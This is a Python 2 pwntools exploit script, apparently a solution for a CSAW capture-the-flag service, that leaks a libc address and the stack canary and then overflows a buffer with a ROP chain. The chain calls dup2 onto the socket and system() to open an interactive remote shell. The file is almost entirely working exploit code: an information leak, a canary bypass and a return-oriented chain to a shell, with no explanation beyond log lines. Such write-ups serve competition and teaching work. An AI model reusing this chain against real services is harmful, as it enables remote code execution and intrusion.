#!/usr/bin/env python2
# encoding: utf-8
# author: bluec0re
from pwn import *
from pwnlib.rop.gadgets import Gadget
import re
import struct
from helperlib import print_hexdump
import sys

def p(addr):
    return struct.pack('<Q', addr)


class ROP2(ROP):
    def __init__(self, *args, **kwargs):
        image_base = kwargs.pop('image_base')
        self.image_base = image_base
        super(ROP2, self).__init__(*args, **kwargs)

    def raw(self, gadget):
        if hasattr(gadget, 'address') and not hasattr(gadget, 'adjusted'):
            gadget.address += self.image_base
            gadget.adjusted = True
        elif hasattr(gadget, 'target'):
            gadget.target += self.image_base
            for arg in gadget.args:
                if hasattr(arg, 'address'):
                    arg.address += self.image_base
        return super(ROP2, self).raw(gadget)

    def setRegisters(self, registers):
        reg_order = super(ROP2, self).setRegisters(registers)

        for gadget, _ in reg_order.values():
            if hasattr(gadget, 'address') and not hasattr(gadget, 'adjusted'):
                gadget.address += self.image_base
                gadget.adjusted = True

        return reg_order

    def search(self, *args, **kwargs):
        gadget = super(ROP2, self).search(*args, **kwargs)
        if hasattr(gadget, 'address') and not hasattr(gadget, 'adjusted'):
            gadget.address += self.image_base
            gadget.adjusted = True
        return gadget

HOST = 'pwn.chal.csaw.io'
PORT = 8002
LIBC = 'libc-2.19.so'
BUF_START = 0x140
BUF_SIZE = 0x138

if len(sys.argv) > 1:
    HOST = '127.0.0.1'
    # LIBC = 'libc.so.6'

libc = ELF(LIBC)
context.clear(arch='amd64')

r = remote(HOST, PORT)
data = r.recvuntil(">")
r.sendline("1")
data = r.recvuntil(">")

m = re.search(r'Reference:0x([0-9a-f]+)', data)
puts_addr = int(m.group(1), 16) + 1280
puts = libc.symbols['puts']
base_addr = puts_addr - puts
rop = ROP2(libc, image_base=base_addr)

log.info("Put Addr: 0x{:x}".format(puts_addr))
log.info("Original Put Addr: 0x{:x}".format(puts))
log.info("Image Base Addr: 0x{:x}".format(base_addr))

system_addr = base_addr + libc.symbols['system']
exit_addr = base_addr + libc.symbols['exit']

log.info("System Addr: 0x{:x}".format(system_addr))
log.info("Exit Addr: 0x{:x}".format(exit_addr))

r.sendline("2")
data = r.recvuntil(">")

r.sendline("AAAA")
data = r.recvuntil(">")

stack_cookie = data[0x138:0x140]
stored_rbp_word = struct.unpack('<Q', data[0x140:0x144] + '\0\0\0\0')[0]
stored_rbp = stored_rbp_word + (0xffffffff00000000 & puts_addr)
print_hexdump(stack_cookie, cols=16)
log.info('Stored RBP: %x (%x)', stored_rbp, stored_rbp_word)
rbp = stored_rbp - 0x20 - 0x10
log.info('RBP: %x', rbp)
buffer_start = rbp - 0x140
buffer_end = buffer_start + BUF_SIZE


rop.raw(unpack(stack_cookie))
rop.raw(stored_rbp)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.system(0x0017c8c3 + base_addr)


r.sendline("2")
data = r.recvuntil(">")


rop.base = buffer_start

exploit = "A" * BUF_SIZE

print(rop.dump())
exploit += str(rop)


log.info("Total len: %x", len(exploit))

r.sendline(exploit)
data = r.recvuntil(stack_cookie)
data += r.recv(4)
assert data == exploit[:len(data)]
r.interactive()
